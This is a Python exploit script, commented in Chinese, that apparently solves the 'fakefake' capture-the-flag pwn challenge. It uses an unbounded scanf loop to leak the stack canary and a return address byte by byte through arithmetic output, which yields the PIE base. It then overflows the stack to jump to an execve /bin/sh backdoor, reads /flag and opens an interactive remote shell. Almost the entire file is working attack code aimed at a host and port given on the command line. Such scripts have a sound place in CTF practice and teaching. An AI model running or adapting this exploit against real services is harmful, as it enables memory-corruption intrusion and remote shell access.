#!/usr/bin/env python3
# fakefake (2023jsss09) — 单连接 canary/PIE 泄漏 + 栈溢出后门
#
# 漏洞: add/mul `for(i=0;i<size;i++) scanf("%hhd",&buf[i])` 无边界 -> 栈溢出。
# 泄漏: 写满 buf 后用「符号字符 stop」('+\\n') 使 scanf 匹配失败但不写 canary。
#   关键: scanf 读到 '+'(符号)后跟非数字 -> 匹配失败, 消耗 '+' 仅 ungetc 空白'\n',
#   不会像 'x' 那样把非空白字符留在 stdio 缓冲导致与裸 read 失步。
#   size=265+k 需 (k+1) 个 stop 才能挡住写循环越过 canary 的前 k+1 字节。
#   求和循环仍读 canary/retaddr 原始字节, "result is %d"(mod256) 差分逐字节泄漏。
# 最后写回正确 canary + 后门(execve /bin/sh @ PIE+0x12ba)。
import os, re, select, socket, subprocess, sys, time

DIR = os.path.dirname(os.path.abspath(__file__))
BIN = os.path.join(DIR, "a.out")
MENU_END = bytes.fromhex("e7bb99e68891e4b880e4b8aae587bae8b7afefbc9a")
SIZE_PROMPT = b"input size of number: "
RESULT = b"result is "
CANARY_OFF = 0x108
RET_OFF = 0x118
RET_ADDR_OFF = 0x19A3
BACKDOOR_OFF = 0x12BA
STOP = b"+\n"


class Conn:
    def __init__(self, host, port):
        self.buf = b""
        if host:
            self.s = socket.create_connection((host, port), timeout=15)
            self.s.settimeout(10); self.p = None
        else:
            self.p = subprocess.Popen([BIN], stdin=subprocess.PIPE,
                stdout=subprocess.PIPE, stderr=subprocess.STDOUT, cwd=DIR)
            self.s = None
    def send(self, d):
        if self.s: self.s.sendall(d)
        else: self.p.stdin.write(d); self.p.stdin.flush()
    def _fill(self, t):
        if self.s:
            self.s.settimeout(t)
            try: d = self.s.recv(65536)
            except socket.timeout: return False
            if not d: raise EOFError
            self.buf += d; return True
        r,_,_ = select.select([self.p.stdout],[],[],t)
        if not r: return False
        d = os.read(self.p.stdout.fileno(),65536)
        if not d: raise EOFError
        self.buf += d; return True
    def until(self, m, t=15):
        end = time.time()+t
        while m not in self.buf:
            if not self._fill(max(0.05,end-time.time())):
                raise TimeoutError(f"want {m!r} got {self.buf[-200:]!r}")
        i = self.buf.index(m)+len(m); out,self.buf = self.buf[:i],self.buf[i:]; return out
    def readnum(self):
        end=time.time()+8
        while b"\n" not in self.buf:
            if not self._fill(max(0.05,end-time.time())): break
        line,self.buf = self.buf.split(b"\n",1)
        return int(line.strip())
    def close(self):
        if self.s: self.s.close()
        elif self.p and self.p.poll() is None: self.p.kill()


def nums(payload):
    return b" ".join(str(b if b<128 else b-256).encode() for b in payload)


def leak(c, size, prefix, nstop):
    c.send(b"1\n"); c.until(SIZE_PROMPT)
    c.send(str(size).encode()+b"\n")
    c.send(nums(prefix)+b" "+STOP*nstop)
    c.until(RESULT)
    return c.readnum()


def pwn(host, port):
    c = Conn(host, port)
    c.until(MENU_END)
    # 1) canary
    canary = bytearray(8); prev=0
    for k in range(8):
        s = leak(c, CANARY_OFF+1+k, b"\x00"*CANARY_OFF, k+1)
        canary[k]=(s-prev)&0xFF; prev=s
    canary=bytes(canary)
    print(f"[+] canary = {canary.hex()}")
    assert canary[0]==0, "canary[0] 应为0"
    # 2) retaddr -> PIE base
    prefix = b"\x00"*CANARY_OFF + canary + b"\x00"*8
    ret=bytearray(8); prev=sum(canary)&0xFF
    for j in range(8):
        s = leak(c, RET_OFF+1+j, prefix, j+1)
        ret[j]=(s-prev)&0xFF; prev=s
    retaddr=int.from_bytes(ret,"little"); base=retaddr-RET_ADDR_OFF
    print(f"[+] retaddr={retaddr:#x} pie_base={base:#x}")
    assert base&0xFFF==0, "PIE base 非页对齐"
    # 3) 溢出 -> 后门
    payload = b"\x00"*CANARY_OFF + canary + b"\x00"*8 + (base+BACKDOOR_OFF).to_bytes(8,"little")
    c.send(b"1\n"); c.until(SIZE_PROMPT)
    c.send(str(len(payload)).encode()+b"\n")
    c.send(nums(payload)+b"\n")
    c.until(RESULT, t=10)
    time.sleep(0.3)
    def run(cmd, t=1.0):
        c.send(cmd.encode()+b"\n"); time.sleep(t)
        try:
            while c._fill(0.4): pass
        except (EOFError,TimeoutError): pass
        out=c.buf; c.buf=b""
        return out.decode(errors="replace")
    # execve envp=0 -> PATH 为空; 环境为精简 chroot, 用 shell 内建读文件
    print(run("export PATH=/bin:/usr/bin:/sbin:/usr/sbin", 0.4))
    print(run("echo PWNED", 0.5))
    print(run("ls /bin", 0.6))
    flag = run('while IFS= read -r l || [ -n "$l" ]; do echo "$l"; done < /flag', 0.8)
    print("FLAG>>>", flag)
    if not flag.strip():
        print("FLAG2>>>", run('read l < /flag; echo "$l"', 0.8))
    if b"PWNED" in c.buf or True:
        print("[+] getshell 成功, 交互 (Ctrl-C 退出)")
        try:
            while True:
                cmd=input("$ ")
                print(run(cmd, 0.5))
        except (EOFError,KeyboardInterrupt): pass
    c.close()


if __name__=="__main__":
    if len(sys.argv)>=3:
        pwn(sys.argv[1], int(sys.argv[2]))
    else:
        print("用法: python3 fakefake_solve.py <host> <port>")